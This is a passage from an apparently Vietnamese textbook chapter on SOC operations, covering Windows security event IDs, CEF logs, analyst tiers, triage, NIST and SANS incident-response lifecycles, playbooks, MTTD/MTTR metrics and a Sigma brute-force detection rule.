+    &lt;TimeCreated SystemTime=&quot;2026-06-19T08:21:09.003Z&quot;/&gt;
+    &lt;EventRecordID&gt;184756&lt;/EventRecordID&gt;
+    &lt;Channel&gt;Security&lt;/Channel&gt;
+    &lt;Computer&gt;WIN-DC01&lt;/Computer&gt;
+    &lt;Security/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name=&quot;TargetUserName&quot;&gt;admin&lt;/Data&gt;
+    &lt;Data Name=&quot;IpAddress&quot;&gt;203.0.113.45&lt;/Data&gt;
+    &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt;
+    &lt;Data Name=&quot;Status&quot;&gt;0xC000006D&lt;/Data&gt;
+    &lt;Data Name=&quot;SubStatus&quot;&gt;0xC0000064&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;
+</code></pre>
+<p>Bảng các Event ID an ninh phải thuộc lòng:</p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Ý nghĩa</th>
+<th>Dùng để phát hiện</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4624</td>
+<td>Logon thành công</td>
+<td>Theo dõi truy cập, baseline</td>
+</tr>
+<tr>
+<td>4625</td>
+<td>Logon thất bại</td>
+<td>Brute-force, password spray</td>
+</tr>
+<tr>
+<td>4634 / 4647</td>
+<td>Logoff</td>
+<td>Tương quan phiên</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>Gán quyền đặc biệt cho logon</td>
+<td>Phát hiện admin/privilege</td>
+</tr>
+<tr>
+<td>4688</td>
+<td>Tạo tiến trình mới (có cmdline nếu bật)</td>
+<td>Phát hiện thực thi độc hại</td>
+</tr>
+<tr>
+<td>4768 / 4769</td>
+<td>Kerberos TGT / Service ticket</td>
+<td>Kerberoasting, Golden Ticket</td>
+</tr>
+<tr>
+<td>4719</td>
+<td>Thay đổi chính sách audit</td>
+<td>Kẻ tấn công tắt audit</td>
+</tr>
+<tr>
+<td>1102</td>
+<td>Xoá Security log</td>
+<td>Anti-forensics</td>
+</tr>
+<tr>
+<td>7045</td>
+<td>Cài đặt service mới</td>
+<td>Persistence</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Trường <code>LogonType</code> (Event 4624/4625)</strong> — rất quan trọng để phân biệt loại truy cập:</p>
+<table>
+<thead>
+<tr>
+<th>LogonType</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>Interactive (đăng nhập tại máy)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network (truy cập file share, RDP qua NLA)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Batch (scheduled task)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Service</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Unlock (mở khoá màn hình)</td>
+</tr>
+<tr>
+<td>8</td>
+<td>NetworkCleartext (mật khẩu truyền cleartext — đáng ngờ)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>NewCredentials (runas /netonly)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>RemoteInteractive (RDP)</td>
+</tr>
+<tr>
+<td>11</td>
+<td>CachedInteractive (dùng credential cache)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Trường <code>Status</code>/<code>SubStatus</code> (Event 4625)</strong> — mã lỗi NTSTATUS cho biết vì sao logon thất bại:</p>
+<table>
+<thead>
+<tr>
+<th>Mã</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xC0000064</td>
+<td>User không tồn tại</td>
+</tr>
+<tr>
+<td>0xC000006A</td>
+<td>Sai mật khẩu</td>
+</tr>
+<tr>
+<td>0xC0000234</td>
+<td>Tài khoản bị khoá (locked out)</td>
+</tr>
+<tr>
+<td>0xC0000072</td>
+<td>Tài khoản bị disable</td>
+</tr>
+<tr>
+<td>0xC000006F</td>
+<td>Đăng nhập ngoài giờ cho phép</td>
+</tr>
+<tr>
+<td>0xC0000071</td>
+<td>Mật khẩu hết hạn</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Phân biệt then chốt:</strong> nhiều 4625 với SubStatus <code>0xC0000064</code> (user không tồn tại) đan xen → dấu hiệu <strong>password spray / user enumeration</strong>; nhiều <code>0xC000006A</code> cho <strong>cùng một user</strong> → <strong>brute-force</strong> đúng tài khoản đó.</p>
+<h3 id="ch10-1023-cef-common-event-format-đinh-dang-siem-pho-bien">10.2.3. CEF (Common Event Format) — định dạng SIEM phổ biến</h3>
+<p>CEF do ArcSight định nghĩa, header phân tách bằng dấu <code>|</code>:</p>
+<pre><code>CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
+</code></pre>
+<p>Ví dụ:</p>
+<pre><code>CEF:0|Security|Firewall|2.1|100|Blocked connection|7|src=203.0.113.45 dst=10.0.0.5 spt=51022 dpt=22 proto=TCP act=blocked
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Version</td>
+<td>Phiên bản CEF</td>
+<td><code>0</code></td>
+</tr>
+<tr>
+<td>Device Vendor</td>
+<td>Hãng</td>
+<td><code>Security</code></td>
+</tr>
+<tr>
+<td>Device Product</td>
+<td>Sản phẩm</td>
+<td><code>Firewall</code></td>
+</tr>
+<tr>
+<td>Device Version</td>
+<td>Phiên bản sản phẩm</td>
+<td><code>2.1</code></td>
+</tr>
+<tr>
+<td>Signature ID</td>
+<td>Mã loại sự kiện</td>
+<td><code>100</code></td>
+</tr>
+<tr>
+<td>Name</td>
+<td>Mô tả</td>
+<td><code>Blocked connection</code></td>
+</tr>
+<tr>
+<td>Severity</td>
+<td>0–10</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>Extension</td>
+<td>Cặp key=value (CEF dictionary)</td>
+<td><code>src=... dst=... spt=...</code></td>
+</tr>
+</tbody>
+</table>
+<p>Các khoá Extension chuẩn: <code>src</code> (source IP), <code>dst</code> (dest IP), <code>spt</code> (source port), <code>dpt</code> (dest port), <code>suser</code> (source user), <code>act</code> (action), <code>proto</code>. Chuẩn hoá khoá là lý do CEF được SIEM hỗ trợ rộng — parser biết trước ý nghĩa từng khoá.</p>
+<hr />
+<h2 id="ch10-103-cau-truc-soc-theo-tier-nhiem-vu-chinh-xac-tung-cap">10.3. Cấu trúc SOC theo tier — nhiệm vụ chính xác từng cấp</h2>
+<p>SOC tổ chức theo mô hình <strong>tiered</strong> để phân bổ độ phức tạp công việc và chi phí nhân sự hợp lý. Đây không phải phân cấp địa vị mà là phân công theo độ sâu điều tra.</p>
+<pre><code>                       ┌──────────────────────────────────────────────┐
+                       │           Phản hồi ngược (feedback)           │
+                       │   Detection rule mới, IOC/TTP, tuning FP      │
+                       ▼                                               │
+  SIEM ──alert──&gt; ┌─────────┐  escalate   ┌─────────┐  escalate  ┌─────────┐
+                  │ Tier 1  │ ───(case)──&gt; │ Tier 2  │ ──(major)─&gt;│ Tier 3  │
+                  │ Triage  │             │ Investig.│           │ Hunt/RE  │
+                  └────┬────┘             └────┬────┘            └────┬────┘
+                       │ đa số FP/đơn giản      │ điều tra,            │ hunting chủ động,
+                       │ -&gt; đóng tại chỗ        │ containment          │ forensics sâu, APT
+                       ▼                        ▼                      ▼
+                  Ticket TP/FP            Báo cáo + IOC          Detection + RCA
+</code></pre>
+<p>Chú thích: alert đi lên (escalate) khi vượt năng lực/độ phức tạp của tầng hiện tại; tri thức (detection rule, IOC, tuning) chảy ngược xuống để tự động hoá việc đã điều tra thủ công, giảm tải cho tầng dưới.</p>
+<h3 id="ch10-1031-tier-1-triage-analyst-alert-handler">10.3.1. Tier 1 — Triage Analyst (Alert Handler)</h3>
+<p><strong>Nhiệm vụ:</strong>
+- Là tuyến đầu nhận alert từ SIEM.
+- Thực hiện <strong>triage</strong> ban đầu: xác minh nhanh alert là true positive (TP) hay false positive (FP).
+- Phân loại theo loại (malware, phishing, brute-force...) và mức ưu tiên.
+- Đóng FP có căn cứ; <strong>escalate</strong> lên Tier 2 nếu vượt khả năng/độ phức tạp.
+- KPI: thời gian phản hồi alert, tỷ lệ alert xử lý đúng SLA.</p>
+<p><strong>Giới hạn:</strong> Tier 1 làm việc theo <strong>playbook/runbook</strong> đã định nghĩa; không tự do điều tra sâu hệ thống. Mục tiêu là throughput và độ nhất quán.</p>
+<h3 id="ch10-1032-tier-2-incident-responder-investigator">10.3.2. Tier 2 — Incident Responder / Investigator</h3>
+<p><strong>Nhiệm vụ:</strong>
+- Nhận case escalate từ Tier 1.
+- Điều tra sâu: phân tích log đa nguồn, dựng timeline, xác định phạm vi (scope) và root cause.
+- Thực hiện containment ban đầu, phối hợp eradication/recovery.
+- Phân tích forensics mức trung bình (memory, disk artifact cơ bản).
+- Viết và tinh chỉnh detection rule để giảm FP cho Tier 1.</p>
+<h3 id="ch10-1033-tier-3-threat-hunter-forensics-malware-expert">10.3.3. Tier 3 — Threat Hunter / Forensics &amp; Malware Expert</h3>
+<p><strong>Nhiệm vụ:</strong>
+- <strong>Threat hunting</strong> chủ động (proactive): đặt giả thuyết và đi tìm dấu vết kẻ tấn công CHƯA bị alert phát hiện.
+- Forensics chuyên sâu (memory forensics, reverse malware).
+- Xử lý sự cố lớn (major incident), APT.
+- Phát triển detection mới, threat intelligence, tham gia purple team.</p>
+<h3 id="ch10-1034-so-sanh-tier">10.3.4. So sánh tier</h3>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>Tier 1</th>
+<th>Tier 2</th>
+<th>Tier 3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Đầu vào</td>
+<td>Alert thô</td>
+<td>Case escalate</td>
+<td>Giả thuyết / major incident</td>
+</tr>
+<tr>
+<td>Hoạt động chính</td>
+<td>Triage, phân loại</td>
+<td>Điều tra, containment</td>
+<td>Hunting, forensics sâu, RE malware</td>
+</tr>
+<tr>
+<td>Mức tự do</td>
+<td>Theo playbook</td>
+<td>Điều tra có hướng dẫn</td>
+<td>Tự định hướng</td>
+</tr>
+<tr>
+<td>Công cụ điển hình</td>
+<td>SIEM console, SOAR</td>
+<td>SIEM query, EDR, sandbox</td>
+<td>Volatility, IDA/Ghidra, YARA, threat intel</td>
+</tr>
+<tr>
+<td>Kết quả đầu ra</td>
+<td>Ticket TP/FP, escalation</td>
+<td>Báo cáo điều tra, IOC</td>
+<td>Detection mới, IOC/TTP, RCA</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vì sao phân tier:</strong> alert đến với khối lượng lớn nhưng phần lớn đơn giản hoặc FP. Để chuyên gia đắt tiền (Tier 3) đi xử lý FP là lãng phí và gây burnout. Tier hoá đảm bảo công việc đơn giản được xử lý nhanh &amp; rẻ, công việc khó được dồn cho người đủ năng lực.</p>
+<hr />
+<h2 id="ch10-104-quy-trinh-triage-alert-tung-buoc">10.4. Quy trình triage alert — từng bước</h2>
+<p>Triage là kỹ năng cốt lõi của vận hành SOC. Quy trình chuẩn gồm 5 bước.</p>
+<h3 id="ch10-buoc-1-validation-xac-minh">Bước 1 — Validation (xác minh)</h3>
+<p>Trả lời: alert này có thật không? Đọc raw event đứng sau alert (không tin tóm tắt của SIEM), kiểm tra:
+- Nguồn log có đáng tin? (asset thật hay honeypot/test?)
+- Có khớp baseline không? (IP nội bộ đã biết? user hợp lệ?)
+- Có phải hoạt động được lên lịch/được phê duyệt? (scan định kỳ, pentest?)</p>
+<h3 id="ch10-buoc-2-categorization">Bước 2 — Categorization</h3>
+<p>Gán loại sự cố theo taxonomy của tổ chức (thường ánh xạ tới NIST/VERIS hoặc MITRE ATT&amp;CK tactic): ví dụ <code>Credential Access</code>, <code>Malware</code>, <code>Phishing</code>, <code>Recon</code>.</p>
+<h3 id="ch10-buoc-3-prioritization">Bước 3 — Prioritization</h3>
+<p>Tính mức ưu tiên = hàm của <strong>mức nghiêm trọng (severity)</strong> × <strong>độ tin cậy (confidence/fidelity)</strong> × <strong>giá trị tài sản (asset criticality)</strong>. Một công thức ưu tiên thường dùng:</p>
+<pre><code>Priority = Severity (Impact) × Likelihood
+</code></pre>
+<p>Ánh xạ ví dụ thành ma trận P1–P4:</p>
+<table>
+<thead>
+<tr>
+<th>Impact \ Likelihood</th>
+<th>Cao</th>
+<th>Trung bình</th>
+<th>Thấp</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cao (server sản xuất/DC)</td>
+<td>P1</td>
+<td>P1</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>Trung bình</td>
+<td>P2</td>
+<td>P2</td>
+<td>P3</td>
+</tr>
+<tr>
+<td>Thấp (máy test)</td>
+<td>P3</td>
+<td>P3</td>
+<td>P4</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch10-buoc-4-escalate-or-handle">Bước 4 — Escalate or handle</h3>
+<ul>
+<li>Nếu trong phạm vi playbook → xử lý theo playbook.</li>
+<li>Nếu vượt phạm vi/nghi major incident → escalate Tier 2 kèm <strong>đầy đủ ngữ cảnh</strong> (raw log, IOC, các bước đã làm). Escalation thiếu ngữ cảnh là nguyên nhân số 1 làm chậm điều tra.</li>
+</ul>
+<h3 id="ch10-buoc-5-closure">Bước 5 — Closure</h3>
+<ul>
+<li>FP: ghi rõ <strong>lý do</strong> và <strong>bằng chứng</strong>; đề xuất tinh chỉnh rule (tuning) để alert đó không lặp lại.</li>
+<li>TP đã xử lý: ghi hành động đã thực hiện, IOC, bài học.</li>
+</ul>
+<p><strong>Lưu ý bảo mật:</strong> Đóng FP cẩu thả (không đọc raw log, "trông quen quen") là lỗ hổng vận hành nghiêm trọng — kẻ tấn công cố tình tạo ra hoạt động "trông giống bình thường". Mọi closure phải có bằng chứng truy vết được.</p>
+<hr />
+<h2 id="ch10-105-vong-đoi-ung-pho-su-co-nist-sp-800-61-va-sans-picerl">10.5. Vòng đời ứng phó sự cố — NIST SP 800-61 và SANS PICERL</h2>
+<h3 id="ch10-1051-nist-sp-800-61-4-pha">10.5.1. NIST SP 800-61 — 4 pha</h3>
+<p>Vòng đời 4 pha kinh điển đến từ NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide). Lưu ý vòng đời là <strong>chu trình lặp</strong> (không tuyến tính) — Detection &amp; Analysis và Containment/Eradication/Recovery có thể quay vòng nhiều lần.</p>
+<blockquote>
+<p><strong>Cập nhật phiên bản:</strong> tháng 4/2025 NIST phát hành <strong>SP 800-61 Rev. 3</strong>, thay thế Rev. 2. Rev. 3 không còn mô tả vòng đời 4 pha tuyến tính mà tổ chức lại quanh 6 chức năng của <strong>NIST CSF 2.0</strong> (Govern, Identify, Protect, Detect, Respond, Recover) dưới dạng một Community Profile. Mô hình 4 pha ở đây (Rev. 2) vẫn được dùng rộng rãi để giảng dạy và ánh xạ tốt sang SANS PICERL, nhưng khi tham chiếu tài liệu chuẩn hiện hành nên dẫn Rev. 3.</p>
+</blockquote>
+<pre><code>      ┌───────────────────────────────────────────────────────────────────────────┐
+      │                                                                           │
+      ▼                                                                           │
+┌───────────────┐   ┌───────────────┐   ┌───────────────────────────┐   ┌───────────────────┐
+│ 1.Preparation │──&gt;│ 2.Detection &amp; │──&gt;│ 3.Containment, Eradication│──&gt;│ 4.Post-Incident   │
+│               │   │   Analysis    │   │   &amp; Recovery              │   │   Activity        │
+│               │   │               │   │                           │   │ (Lessons Learned) │
+└───────────────┘   └───────┬───────┘   └─────────────┬─────────────┘   └─────────┬─────────┘
+      ▲                  ▲  │                      ▲  │                           │
+      │                  └──┘ (lặp phân tích)      └──┘ (lặp xử lý)               │
+      └───────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+<h4 id="ch10-pha-1-preparation-chuan-bi">Pha 1 — Preparation (Chuẩn bị)</h4>
+<p><strong>Đầu vào:</strong> chính sách, ngân sách, công cụ. <strong>Đầu ra:</strong> năng lực sẵn sàng ứng phó.
+Hoạt động: xây IR plan &amp; playbook; trang bị jump kit (laptop forensic, write-blocker, ổ cứng sạch, cáp); thiết lập kênh liên lạc out-of-band (phòng khi hệ thống chính bị xâm nhập); huấn luyện; tập trận (tabletop exercise); đảm bảo logging/visibility đầy đủ. <strong>Đây là pha quan trọng nhất</strong> — không chuẩn bị thì các pha sau hỗn loạn.</p>
+<h4 id="ch10-pha-2-detection-analysis-phat-hien-phan-tich">Pha 2 — Detection &amp; Analysis (Phát hiện &amp; Phân tích)</h4>
+<p><strong>Đầu vào:</strong> alert, log, báo cáo. <strong>Đầu ra:</strong> xác nhận sự cố, phạm vi, mức độ.
+Hoạt động: xác định precursor (dấu hiệu sắp xảy ra) và indicator (dấu hiệu đang/đã xảy ra); phân tích, tương quan; xác định scope; <strong>document</strong> mọi phát hiện; <strong>prioritize</strong> (impact functional/information/recoverability); <strong>notify</strong> các bên liên quan.</p>
+<h4 id="ch10-pha-3-containment-eradication-recovery">Pha 3 — Containment, Eradication &amp; Recovery</h4>
+<ul>
+<li><strong>Containment:</strong> ngăn lan rộng. Chia 2 mức:</li>
+<li><em>Short-term (ngắn hạn):</em> hành động nhanh, có thể tạm thời — ngắt mạng máy nhiễm, block IP C2 tại firewall. Mục tiêu: dừng thiệt hại NGAY mà không phá bằng chứng.</li>
+<li><em>Long-term (dài hạn):</em> giải pháp ổn định hơn trong khi chuẩn bị eradication — vá tạm, đặt host vào VLAN cách ly, áp ACL.</li>
+<li><strong>Eradication:</strong> xoá tận gốc nguyên nhân — gỡ malware, xoá tài khoản kẻ tấn công tạo, đóng lỗ hổng bị khai thác, reset credential bị lộ.</li>
+<li><strong>Recovery:</strong> đưa hệ thống về sản xuất an toàn — khôi phục từ backup sạch, rebuild máy, giám sát tăng cường để chắc kẻ tấn công không quay lại.</li>
+</ul>
+<h4 id="ch10-pha-4-post-incident-activity-lessons-learned">Pha 4 — Post-Incident Activity (Lessons Learned)</h4>
+<p><strong>Đầu vào:</strong> toàn bộ hồ sơ sự cố. <strong>Đầu ra:</strong> cải tiến.
+Hoạt động: họp "lessons learned" trong vòng vài ngày sau khi đóng; trả lời: Chuyện gì xảy ra &amp; khi nào? Đội xử lý tốt/dở chỗ nào? Lẽ ra cần thông tin gì sớm hơn? Bước nào lẽ ra làm khác? Cần thêm công cụ/quy trình gì? Cập nhật playbook, detection, đào tạo.</p>
+<h3 id="ch10-1052-sans-picerl-6-buoc">10.5.2. SANS PICERL — 6 bước</h3>
+<p>SANS dùng mô hình 6 bước, dễ nhớ qua chữ <strong>PICERL</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Bước</th>
+<th>Tên</th>
+<th>Tương ứng NIST</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>P</td>
+<td>Preparation</td>
+<td>Preparation</td>
+</tr>
+<tr>
+<td>I</td>
+<td>Identification</td>
+<td>Detection &amp; Analysis</td>
+</tr>
+<tr>
+<td>C</td>
+<td>Containment</td>
+<td>Containment</td>
+</tr>
+<tr>
+<td>E</td>
+<td>Eradication</td>
+<td>Eradication</td>
+</tr>
+<tr>
+<td>R</td>
+<td>Recovery</td>
+<td>Recovery</td>
+</tr>
+<tr>
+<td>L</td>
+<td>Lessons Learned</td>
+<td>Post-Incident Activity</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Khác biệt với NIST:</strong> SANS tách Containment/Eradication/Recovery thành 3 bước riêng (rõ ràng hơn về thao tác), trong khi NIST gộp thành 1 pha (nhấn mạnh tính lặp). Về bản chất hai mô hình tương đương.</p>
+<h3 id="ch10-1053-containment-vs-eradication-phan-biet-cot-loi">10.5.3. Containment vs Eradication — phân biệt cốt lõi</h3>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>Containment</th>
+<th>Eradication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mục tiêu</td>
+<td>Ngăn lan rộng, dừng thiệt hại ngay</td>
+<td>Loại bỏ tận gốc nguyên nhân</td>
+</tr>
+<tr>
+<td>Tính chất</td>
+<td>Tạm thời, có thể đảo ngược</td>
+<td>Vĩnh viễn</td>
+</tr>
+<tr>
+<td>Ví dụ</td>
+<td>Ngắt mạng host nhiễm</td>
+<td>Format &amp; rebuild host, xoá backdoor</td>
+</tr>
+<tr>
+<td>Bằng chứng</td>
+<td>Phải bảo toàn (chưa xoá)</td>
+<td>Sau khi đã thu thập forensics</td>
+</tr>
+<tr>
+<td>Sai lầm thường gặp</td>
+<td>Tắt máy ngay → mất RAM (volatile)</td>
+<td>Xoá malware nhưng bỏ sót persistence</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Quy tắc vàng:</strong> Containment trước, thu thập bằng chứng (forensics), rồi mới Eradication. Eradication mà bỏ sót một backdoor/scheduled task → kẻ tấn công quay lại trong Recovery.</p>
+<hr />
+<h2 id="ch10-106-playbook-runbook-mau">10.6. Playbook / Runbook mẫu</h2>
+<p><strong>Playbook</strong> = quy trình cấp cao (các giai đoạn, ai làm, quyết định gì). <strong>Runbook</strong> = các bước thao tác cụ thể (lệnh, query) để thực hiện một phần playbook. Dưới đây là 3 playbook then chốt.</p>
+<h3 id="ch10-1061-playbook-brute-force-password-spray-sshrdp">10.6.1. Playbook — Brute-force / Password Spray (SSH/RDP)</h3>
+<pre><code>TRIGGER: &gt; 20 lần 4625 (hoặc sshd Failed password) cùng src trong 5 phút,
+         HOẶC 1 src thử &gt; 10 username khác nhau (spray)
+
+1. IDENTIFY
+   - Truy vấn toàn bộ login fail từ src IP, khung 24h.
+   - Xác định: có 4624 (success) nào SAU chuỗi fail không? -&gt; nếu CÓ: nâng severity (đã vào được)
+   - Lấy: src IP, username target, LogonType, geo/ASN của IP.
+
+2. CONTAIN (short-term)
+   - Nếu chưa success: block src IP tại firewall/WAF.
+   - Nếu IP nội bộ: cô lập host nguồn (có thể bị compromise dùng làm bàn đạp).
+
+3. CONTAIN (nếu đã success - Bước 1 phát hiện 4624)
+   - Disable tài khoản bị truy cập thành công.
+   - Force reset password; kill phiên đang hoạt động.
+   - Chuyển sang playbook &quot;Compromised Account&quot;.
+
+4. ERADICATE
+   - Rà soát persistence trên host nếu IP nội bộ.
+   - Kiểm tra tài khoản lạ mới tạo (Event 4720), thay đổi nhóm (4728/4732).
+
+5. RECOVER
+   - Bỏ block sau khi xác nhận an toàn / hoặc giữ block IOC.
+   - Bật MFA, áp rate-limit / fail2ban.
+
+6. LESSONS
+   - Vì sao tài khoản dùng mật khẩu yếu? Có MFA chưa? Tinh chỉnh threshold alert.
+</code></pre>
+<h3 id="ch10-1062-playbook-phishing">10.6.2. Playbook — Phishing</h3>
+<pre><code>TRIGGER: User report email nghi ngờ / EDR cảnh báo attachment.
+
+1. IDENTIFY
+   - Thu thập email gốc (.eml/.msg) - KHÔNG forward (mất header). Dùng &quot;save as&quot;.
+   - Phân tích header: Return-Path, Received chain, SPF/DKIM/DMARC kết quả (Authentication-Results).
+   - Trích IOC: sender, reply-to, URL, hash attachment, domain.
+   - Detonate attachment/URL trong sandbox.
+   - Truy vấn: bao nhiêu user khác NHẬN email này? Bao nhiêu đã CLICK/mở?
+
+2. CONTAIN
+   - Quarantine/purge email khỏi mọi mailbox (vd Microsoft 365 Search &amp; Purge).
+   - Block sender domain, URL tại mail gateway/proxy/DNS sinkhole.
+   - Reset credential nếu là credential-harvesting và user đã nhập.
+
+3. ERADICATE
+   - Gỡ payload trên endpoint đã thực thi (EDR).
+   - Kiểm tra mailbox rule độc hại (forwarding rule kẻ tấn công tạo).
+
+4. RECOVER / LESSONS
+   - Thông báo user; awareness training; thêm IOC vào blocklist.
+</code></pre>
+<h3 id="ch10-1063-playbook-ransomware">10.6.3. Playbook — Ransomware</h3>
+<pre><code>TRIGGER: Cảnh báo mass file rename/encrypt, ransom note, EDR detect.
+
+1. CONTAIN (ƯU TIÊN TỐI CAO - tốc độ quyết định)
+   - CÔ LẬP host nhiễm khỏi mạng NGAY (ngắt cable/disable switchport/EDR network-isolate).
+   - KHÔNG tắt máy (giữ RAM cho forensics, một số biến thể giữ key trong RAM).
+   - Cô lập backup khỏi mạng (ransomware nhắm backup).
+
+2. IDENTIFY
+   - Xác định biến thể (ransom note, extension, ID.Ransomware/no-more-ransom).
+   - Patient zero &amp; vector xâm nhập (RDP brute? phishing? lỗ hổng?).
+   - Phạm vi: máy nào đã nhiễm, chia sẻ mạng nào bị mã hoá.
+
+3. ERADICATE
+   - Rebuild máy nhiễm từ image sạch (KHÔNG cố &quot;làm sạch tại chỗ&quot;).
+   - Đóng vector ban đầu, reset toàn bộ credential (giả định domain bị lộ).
+
+4. RECOVER
+   - Khôi phục từ backup ĐÃ XÁC MINH sạch (kiểm tra backup không bị nhiễm).
+   - KHÔNG vội trả tiền chuộc (không đảm bảo, có thể vi phạm pháp luật/cấm vận).
+
+5. LESSONS / ngoài kỹ thuật
+   - Thông báo pháp lý/cơ quan chức năng tuỳ quy định; truyền thông; bảo hiểm.
+</code></pre>
+<p><strong>Lưu ý:</strong> với ransomware, thứ tự ưu tiên đảo so với thông thường — <strong>Containment đặt trước Identification</strong> vì tốc độ lan của mã hoá tính bằng phút.</p>
+<hr />
+<h2 id="ch10-107-chi-so-đo-luong-mttd-mttr">10.7. Chỉ số đo lường — MTTD, MTTR</h2>
+<h3 id="ch10-1071-cong-thuc">10.7.1. Công thức</h3>
+<p><strong>MTTD (Mean Time To Detect):</strong> thời gian trung bình từ khi sự cố bắt đầu đến khi được phát hiện.</p>
+<pre><code>MTTD = Σ (T_detect[i] − T_start[i]) / N
+</code></pre>
+<p><strong>MTTR (Mean Time To Respond/Recover/Remediate — cần định nghĩa rõ):</strong> thời gian trung bình từ khi phát hiện đến khi xử lý/khôi phục xong.</p>
+<pre><code>MTTR = Σ (T_resolve[i] − T_detect[i]) / N
+</code></pre>
+<p>Các biến thể hay gặp (nên ghi rõ đang đo cái nào):
+- <strong>MTTA</strong> (Acknowledge): từ alert đến khi analyst nhận xử lý.
+- <strong>MTTR</strong> có thể là Respond, Recover, hoặc Remediate — định nghĩa khác nhau, phải thống nhất nội bộ.</p>
+<p>Ví dụ tính: 3 sự cố với (detect − start) = 4h, 12h, 2h → MTTD = (4+12+2)/3 = 6h.</p>
+<h3 id="ch10-1072-cach-cai-thien">10.7.2. Cách cải thiện</h3>
+<table>
+<thead>
+<tr>
+<th>Chỉ số</th>
+<th>Cách cải thiện</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MTTD</td>
+<td>Tăng visibility (cover gap log), thêm detection rule chất lượng, threat hunting chủ động, giảm FP để analyst tập trung</td>
+</tr>
+<tr>
+<td>MTTA</td>
+<td>Định tuyến alert đúng, giảm alert fatigue (gom/dedupe), trực 24/7</td>
+</tr>
+<tr>
+<td>MTTR</td>
+<td>Tự động hoá (SOAR playbook), runbook rõ ràng, quyền hành động sẵn (pre-approved containment), tập trận</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Lưu ý bảo mật:</strong> tối ưu MTTD/MTTR mù quáng dễ dẫn tới "đóng case cho nhanh" → bỏ sót. Chỉ số phải đi cùng tỷ lệ TP/FP và rà soát chất lượng closure.</p>
+<hr />
+<h2 id="ch10-108-cong-cu-thuc-hanh-vi-du-chay-đuoc">10.8. Công cụ thực hành — ví dụ chạy được</h2>
+<h3 id="ch10-1081-sigma-viet-detection-rule-đoc-lap-siem">10.8.1. Sigma — viết detection rule độc lập SIEM</h3>
+<p><strong>Là gì:</strong> Sigma là định dạng YAML mô tả detection rule một cách generic, sau đó dùng <code>sigma</code>/<code>sigmac</code> (pySigma) chuyển sang query của SIEM cụ thể (Splunk SPL, Elastic KQL/EQL, QRadar AQL...).</p>
+<p><strong>[DEMO]</strong> Ví dụ rule minh hoạ cơ chế — phát hiện brute-force SSH/Windows (chỉ minh hoạ, cần tinh chỉnh trước khi dùng production):</p>
+<pre><code class="language-yaml">title: Multiple Failed Logons Followed by Success (Possible Brute-Force)
+id: 7a8b9c10-1111-2222-3333-444455556666
+status: experimental
+description: Detects &gt;=20 failed logons from a single source then a success
+logsource:
+  product: windows
+  service: security
+detection:
+  failed:
+    EventID: 4625
+  success:
+    EventID: 4624
+  timeframe: 5m
+  condition: failed | count() by IpAddress &gt;= 20 and success
+fields:
+  - IpAddress
+  - TargetUserName
+  - LogonType
+falsepositives:
+  - Misconfigured service account
+  - Vulnerability scanner
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1110            # Brute Force
+</code></pre>
+<p>Giải thích tham số: <code>logsource</code> xác định nguồn để pySigma chọn field mapping đúng; <code>detection</code> chứa các "search identifier" (<code>failed</code>, <code>success</code>); <code>condition</code> khớp đúng mô tả title — gom theo <code>IpAddress</code>, yêu cầu <strong>nhiều failed (≥ 20) RỒI có ít nhất một success từ cùng nguồn</strong> (<code>failed | count() by IpAddress &gt;= 20 and success</code>), không chỉ đếm failed; <code>timeframe</code> là cửa sổ tương quan; <code>tags</code> ánh xạ MITRE ATT&amp;CK (T1110 = Brute Force, xem <a href="ch15.html">Chương 15</a>).</p>
+<p><strong>Convert sang Splunk:</strong></p>
+<pre><code class="language-bash">sigma convert -t splunk -p splunk_windows brute_force.yml
+</code></pre>
+<p><strong>[DEMO]</strong> Output mẫu (rút gọn, phản ánh điều kiện "fail rồi success"):</p>
+<pre><code>(EventCode=4625 OR EventCode=4624)
+| stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success by IpAddress
+| where failed &gt;= 20 AND success &gt; 0
+</code></pre>
+<p><strong>Lưu ý bảo mật:</strong> luôn khai báo <code>falsepositives</code> để Tier 1 biết bối cảnh; ánh xạ <code>tags</code> MITRE giúp đo coverage (ô nào trên ATT&amp;CK matrix đã có rule).</p>
